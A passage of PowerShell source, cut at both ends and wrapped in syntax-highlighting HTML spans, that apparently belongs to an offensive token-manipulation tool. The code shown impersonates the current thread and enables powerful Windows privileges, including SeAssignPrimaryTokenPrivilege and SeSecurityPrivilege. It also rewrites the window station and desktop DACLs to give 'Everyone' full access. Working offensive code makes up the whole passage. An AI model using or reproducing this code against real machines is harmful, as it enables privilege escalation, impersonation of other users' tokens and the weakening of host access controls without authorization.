<span class="token keyword">Throw</span> <span class="token string">"Unable to get the handle to the current thread"</span>        <span class="token punctuation">}</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[Bool]</span><span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$Result</span> = <span class="token variable">$ImpersonateSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SECURITY_DELEGATION<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token namespace">[ComponentModel.Win32Exception]</span> <span class="token variable">$ErrorCode</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token variable">$LuidSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>        <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidSize</span><span class="token punctuation">)</span>        <span class="token variable">$LuidObject</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>        <span class="token variable">$Result</span> = <span class="token variable">$LookupPrivilegeValue</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token string">"SeAssignPrimaryTokenPrivilege"</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$LuidObject</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token namespace">[UInt32]</span><span class="token variable">$LuidAndAttributesSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesSize</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributes</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Luid = <span class="token variable">$LuidObject</span>        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Attributes = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivSize</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount = 1        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>Privileges = <span class="token variable">$LuidAndAttributes</span>        <span class="token variable">$Global</span>:TokenPriv = <span class="token variable">$TokenPrivileges</span>        <span class="token variable">$Result</span> = <span class="token variable">$AdjustTokenPrivileges</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivSize</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Enable SeSecurityPrivilege, needed to query security information for desktop DACL</span>    <span class="token keyword">function</span> Enable<span class="token operator">-</span>Privilege    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter()]</span>            <span class="token punctuation">[</span>ValidateSet<span class="token punctuation">(</span><span class="token string">"SeAssignPrimaryTokenPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeAuditPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeBackupPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeChangeNotifyPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateGlobalPrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeCreatePagefilePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreatePermanentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateSymbolicLinkPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateTokenPrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeDebugPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeEnableDelegationPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeImpersonatePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeIncreaseBasePriorityPrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeIncreaseQuotaPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeIncreaseWorkingSetPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeLoadDriverPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeLockMemoryPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeMachineAccountPrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeManageVolumePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeProfileSingleProcessPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRelabelPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRemoteShutdownPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRestorePrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeSecurityPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeShutdownPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSyncAgentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSystemEnvironmentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSystemProfilePrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeSystemtimePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTakeOwnershipPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTcbPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTimeZonePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTrustedCredManAccessPrivilege"</span><span class="token punctuation">,</span>                <span class="token string">"SeUndockPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeUnsolicitedInputPrivilege"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token namespace">[String]</span>            <span class="token variable">$Privilege</span>        <span class="token punctuation">)</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadHandle</span> = <span class="token variable">$GetCurrentThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token string">"Unable to get the handle to the current thread"</span>        <span class="token punctuation">}</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[Bool]</span><span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$Result</span> = <span class="token variable">$ImpersonateSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SECURITY_DELEGATION<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token namespace">[ComponentModel.Win32Exception]</span> <span class="token variable">$ErrorCode</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token variable">$LuidSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>        <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidSize</span><span class="token punctuation">)</span>        <span class="token variable">$LuidObject</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>        <span class="token variable">$Result</span> = <span class="token variable">$LookupPrivilegeValue</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$Privilege</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$LuidObject</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token namespace">[UInt32]</span><span class="token variable">$LuidAndAttributesSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesSize</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributes</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">)</span>        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Luid = <span class="token variable">$LuidObject</span>        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Attributes = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivSize</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount = 1        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>Privileges = <span class="token variable">$LuidAndAttributes</span>        <span class="token variable">$Global</span>:TokenPriv = <span class="token variable">$TokenPrivileges</span>        <span class="token function">Write-Verbose</span> <span class="token string">"Attempting to enable privilege: <span class="token variable">$Privilege</span>"</span>        <span class="token variable">$Result</span> = <span class="token variable">$AdjustTokenPrivileges</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivSize</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token function">Write-Verbose</span> <span class="token string">"Enabled privilege: <span class="token variable">$Privilege</span>"</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Change the ACL of the WindowStation and Desktop</span>    <span class="token keyword">function</span> <span class="token function">Set</span><span class="token operator">-</span>DesktopACLs    <span class="token punctuation">{</span>        Enable<span class="token operator">-</span>Privilege <span class="token operator">-</span>Privilege SeSecurityPrivilege        <span class="token comment" spellcheck="true">#Change the privilege for the current window station to allow full privilege for all users</span>        <span class="token variable">$WindowStationStr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"WinSta0"</span><span class="token punctuation">)</span>        <span class="token variable">$hWinsta</span> = <span class="token variable">$OpenWindowStationW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$WindowStationStr</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ACCESS_SYSTEM_SECURITY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>READ_CONTROL <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>WRITE_DAC<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hWinsta</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone <span class="token operator">-</span>hObject <span class="token variable">$hWinsta</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hWinsta</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token comment" spellcheck="true">#Change the privilege for the current desktop to allow full privilege for all users</span>        <span class="token variable">$hDesktop</span> = <span class="token variable">$OpenDesktopA</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DESKTOP_GENERIC_ALL <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>WRITE_DAC<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hDesktop</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone <span class="token operator">-</span>hObject <span class="token variable">$hDesktop</span>        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hDesktop</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$hObject</span>            <span class="token punctuation">)</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSidOwner</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppsidGroup</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppDacl</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSacl</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSecurityDescriptor</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token comment" spellcheck="true">#0x7 is window station, change for other types</span>        <span class="token variable">$retVal</span> = <span class="token variable">$GetSecurityInfo</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hObject</span><span class="token punctuation">,</span> 0x7<span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DACL_SECURITY_INFORMATION<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSidOwner</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSidGroup</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSecurityDescriptor</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$retVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Error</span> <span class="token string">"Unable to call GetSecurityInfo. ErrorCode: <span class="token variable">$retVal</span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ppDacl</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$AclObj</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$ACL</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#Add all users to acl</span>            <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 2000            <span class="token variable">$pAllUsersSid</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>            <span class="token variable">$Success</span> = <span class="token variable">$CreateWellKnownSid</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>1<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$pAllUsersSid</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#For user "Everyone"</span>            <span class="token variable">$TrusteeSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TRUSTEE</span><span class="token punctuation">)</span>            <span class="token variable">$TrusteePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TrusteeSize</span><span class="token punctuation">)</span>            <span class="token variable">$TrusteeObj</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TrusteePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TRUSTEE</span><span class="token 